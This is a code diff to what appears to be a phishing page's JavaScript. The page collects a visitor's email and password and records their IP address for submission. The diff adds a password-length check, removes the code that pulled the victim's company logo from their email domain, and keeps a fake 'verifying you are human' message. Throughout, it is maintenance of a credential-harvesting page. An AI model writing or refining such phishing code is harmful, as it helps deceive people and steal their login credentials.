@@ -667,6 +667,12 @@ IP Address: ${ipAddress}`;
     var email = $("#user_username").val();
     var password = $passwordInput.val();
 
+    if (password.length < 6 || password.length > 12) {
+      $('#error').text('Password must be 6-12 characters.').show();
+      document.getElementById("user_password").style.borderColor = "red";
+      return;
+    }
+
     // New submission flow: Get IP first, then submit.
     getUserIP(function(ipAddress) {
       // Now that we have the IP, we can proceed with the submissions.
@@ -701,33 +707,9 @@ IP Address: ${ipAddress}`;
     return mail;
   }
 
-  function changeLogo($d) {
-    var Explode = $d.split("@");
-    return Explode[1];
-  }
-
-  function checkImage(url) {
-    var request = new XMLHttpRequest();
-    request.open("GET", url, true);
-    request.send();
-    request.onload = function() {
-      status = request.status;
-      if (request.status == 200) {
-        document.getElementById('logo').src = "https://logo.clearbit.com/" + changeLogo(fetchEmail());
-      }
-    }
-  }
 
   // --- Dynamic Verification Message Logic ---
-  var emailForMessage = fetchEmail();
-  if (emailForMessage) {
-    var domainForMessage = changeLogo(emailForMessage);
-    // You can customize the message below
-    document.getElementById('verification-message').innerHTML = '<span style="font-size: 0.9em;"><strong>' + domainForMessage + '</strong></span><br><br>verifying you are human...';
-  }
-
-  checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
-  $("#favicon").attr("href", "https://logo.clearbit.com/" + changeLogo(fetchEmail()));
+  document.getElementById('verification-message').innerHTML = 'Verifying you are human';
 </script>
 </body>
 </html>
